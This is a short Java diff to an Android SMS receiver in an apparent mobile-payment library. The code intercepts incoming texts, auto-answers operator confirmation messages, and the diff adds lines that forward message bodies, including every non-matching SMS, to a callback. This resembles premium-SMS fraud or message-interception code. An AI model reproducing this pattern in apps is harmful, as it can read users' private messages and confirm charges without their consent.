@@ -14,6 +14,7 @@ import android.telephony.SmsMessage;
 import com.p2plib2.Logger;
 import com.p2plib2.PayLib;
 
+import static com.p2plib2.PayLib.feedback;
 import static com.p2plib2.PayLib.flagok;
 import static com.p2plib2.PayLib.operatorSMS;
 
@@ -63,8 +64,12 @@ public class SmsMonitor extends BroadcastReceiver {
                 flagok=true;
                 PayLib.getSMSResult(smsBody);
                 PayLib.sendAnswer(smsBody, smsSender);
+            } else if((operatorSMS.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorSMS.name)) && smsBody.toLowerCase().contains("выпол")
+                    && !smsBody.toLowerCase().contains("не выпол")){
+                feedback.callResult("Code P2P-003: " + smsBody);
+            } else {
+                feedback.callResult("Code P2P-003: " + smsBody);
             }
-
         } else if (intent.getAction().equals(Telephony.Sms.Intents.SMS_DELIVER_ACTION)) {
             String smsSender = "";
             String smsBody = "";
